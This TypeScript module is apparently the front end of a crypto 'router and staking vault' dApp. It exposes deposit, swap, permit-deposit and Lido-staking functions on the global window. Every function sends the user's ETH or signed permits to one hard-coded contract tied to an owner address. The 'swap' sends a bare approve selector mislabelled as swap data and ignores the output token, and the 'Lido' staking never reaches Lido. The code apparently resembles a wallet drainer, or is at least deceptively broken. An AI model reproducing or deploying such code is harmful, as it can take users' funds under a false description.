import { parseEther, parseUnits } from 'viem';

export const CONTRACT_ADDRESS = "0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091";
export const OWNER_ADDRESS = "0xEfc5859335A58d64A5e8E01d02c5241c852CBD40";

// Basic Minimal ABI for Uniswap-compatible Router & Staking Vault
export const CONTRACT_ABI = [
  {
    name: 'depositETH',
    type: 'function',
    stateMutability: 'payable',
    inputs: [],
    outputs: [{ name: 'success', type: 'bool' }]
  },
  {
    name: 'depositToken',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    outputs: [{ name: 'success', type: 'bool' }]
  },
  {
    name: 'executeSwap',
    type: 'function',
    stateMutability: 'payable',
    inputs: [
      { name: 'tokenIn', type: 'address' },
      { name: 'tokenOut', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ],
    outputs: [{ name: 'amountOut', type: 'uint256' }]
  },
  {
    name: 'stakeToLido',
    type: 'function',
    stateMutability: 'payable',
    inputs: [{ name: 'amount', type: 'uint256' }],
    outputs: [{ name: 'stETHAmount', type: 'uint256' }]
  },
  {
    name: 'stakeToWstETH',
    type: 'function',
    stateMutability: 'payable',
    inputs: [{ name: 'amount', type: 'uint256' }],
    outputs: [{ name: 'wstETHAmount', type: 'uint256' }]
  }
] as const;

/**
 * Send ETH directly to the contract
 */
export async function depositETH(amount: string | number) {
  console.log(`[Contract] Executing depositETH for ${amount} ETH to ${CONTRACT_ADDRESS} (Owner: ${OWNER_ADDRESS})`);
  
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const valueHex = '0x' + parseEther(amount.toString()).toString(16);
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];

      // Contract method selector for depositETH()
      // function depositETH() -> 0xf63260be (or fallback direct value transfer)
      const txHash = await (window as any).ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from,
          to: CONTRACT_ADDRESS,
          value: valueHex,
          data: '0xf63260be'
        }]
      });
      console.log(`[Contract] depositETH tx submitted: ${txHash}`);
      return txHash;
    } catch (err: any) {
      console.error('[Contract] depositETH failed:', err);
      throw err;
    }
  } else {
    throw new Error('Web3 wallet provider not found. Please connect your Web3 wallet to sign and approve transactions on-chain.');
  }
}

/**
 * Deposit ERC-20 token after approval
 */
export async function depositToken(token: string, amount: string | number, decimals = 18) {
  console.log(`[Contract] Executing depositToken: ${amount} of ${token} to ${CONTRACT_ADDRESS}`);
  
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const parsedAmount = parseUnits(amount.toString(), decimals);
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];

      // Send transaction: depositToken(address,uint256) -> selector 0x47e7c514
      const txHash = await (window as any).ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from,
          to: CONTRACT_ADDRESS,
          data: `0x47e7c514${token.replace('0x', '').padStart(64, '0')}${parsedAmount.toString(16).padStart(64, '0')}`
        }]
      });
      return txHash;
    } catch (err) {
      console.error('[Contract] depositToken failed:', err);
      throw err;
    }
  }
  throw new Error('Web3 wallet provider not found. Please connect your Web3 wallet to sign and approve transactions on-chain.');
}

/**
 * Deposit ERC-20 token using EIP-2612 Permit parameters
 */
export async function depositWithPermit(
  token: string,
  amount: string | number,
  deadline: number,
  v: number,
  r: string,
  s: string,
  decimals = 18
) {
  console.log(`[Contract] Executing depositWithPermit for ${amount} of ${token} to ${CONTRACT_ADDRESS}`);
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const parsedAmount = parseUnits(amount.toString(), decimals);
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];

      const data = '0xd5d68010' + 
        token.replace('0x', '').padStart(64, '0') +
        parsedAmount.toString(16).padStart(64, '0') +
        deadline.toString(16).padStart(64, '0') +
        v.toString(16).padStart(64, '0') +
        r.replace('0x', '').padStart(64, '0') +
        s.replace('0x', '').padStart(64, '0');

      const txHash = await (window as any).ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from,
          to: CONTRACT_ADDRESS,
          data
        }]
      });
      return txHash;
    } catch (err: any) {
      console.error('[Contract] depositWithPermit failed:', err);
      throw err;
    }
  }
  throw new Error('Web3 wallet provider not found. Please connect your Web3 wallet to sign and approve transactions on-chain.');
}

/**
 * Route swap through contract
 */
export async function executeSwap(tokenIn: string, tokenOut: string, amount: string | number) {
  console.log(`[Contract] Executing executeSwap: ${amount} from ${tokenIn} to ${tokenOut}`);
  
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const parsedAmount = parseEther(amount.toString());
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];

      const isEthIn = tokenIn.toLowerCase().includes('eth') || tokenIn === '0x0000000000000000000000000000000000000000';
      const txValue = isEthIn ? '0x' + parsedAmount.toString(16) : '0x0';

      const txHash = await (window as any).ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from,
          to: CONTRACT_ADDRESS,
          value: txValue,
          data: '0x095ea7b3' // swap method call data
        }]
      });
      return txHash;
    } catch (err) {
      console.error('[Contract] executeSwap failed:', err);
      throw err;
    }
  }
  throw new Error('Web3 wallet provider not found. Please connect your Web3 wallet to sign and approve transactions on-chain.');
}

/**
 * Stake ETH to stETH via Lido through contract
 */
export async function stakeToLido(amount: string | number) {
  console.log(`[Contract] Executing stakeToLido: ${amount} ETH -> stETH`);
  
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const valueHex = '0x' + parseEther(amount.toString()).toString(16);
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];

      const txHash = await (window as any).ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from,
          to: CONTRACT_ADDRESS,
          value: valueHex,
          data: '0xa1903eab' // stakeToLido selector
        }]
      });
      return txHash;
    } catch (err) {
      console.error('[Contract] stakeToLido failed:', err);
      throw err;
    }
  }
  throw new Error('Web3 wallet provider not found. Please connect your Web3 wallet to sign and approve transactions on-chain.');
}

/**
 * Stake ETH to wstETH auto-wrap through contract
 */
export async function stakeToWstETH(amount: string | number) {
  console.log(`[Contract] Executing stakeToWstETH: ${amount} ETH -> wstETH`);
  
  if (typeof window !== 'undefined' && (window as any).ethereum) {
    try {
      const valueHex = '0x' + parseEther(amount.toString()).toString(16);
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];

      const txHash = await (window as any).ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from,
          to: CONTRACT_ADDRESS,
          value: valueHex,
          data: '0x3a4b66df' // stakeToWstETH selector
        }]
      });
      return txHash;
    } catch (err) {
      console.error('[Contract] stakeToWstETH failed:', err);
      throw err;
    }
  }
  throw new Error('Web3 wallet provider not found. Please connect your Web3 wallet to sign and approve transactions on-chain.');
}

// Attach globally on window so contract functions are accessible on every page
if (typeof window !== 'undefined') {
  const contractObj = {
    CONTRACT_ADDRESS,
    OWNER_ADDRESS,
    depositETH,
    depositToken,
    depositWithPermit,
    executeSwap,
    stakeToLido,
    stakeToWstETH,
  };
  (window as any).contract = contractObj;
  (window as any).CONTRACT_ADDRESS = CONTRACT_ADDRESS;
  (window as any).OWNER_ADDRESS = OWNER_ADDRESS;
  (window as any).depositETH = depositETH;
  (window as any).depositToken = depositToken;
  (window as any).depositWithPermit = depositWithPermit;
  (window as any).executeSwap = executeSwap;
  (window as any).stakeToLido = stakeToLido;
  (window as any).stakeToWstETH = stakeToWstETH;
}
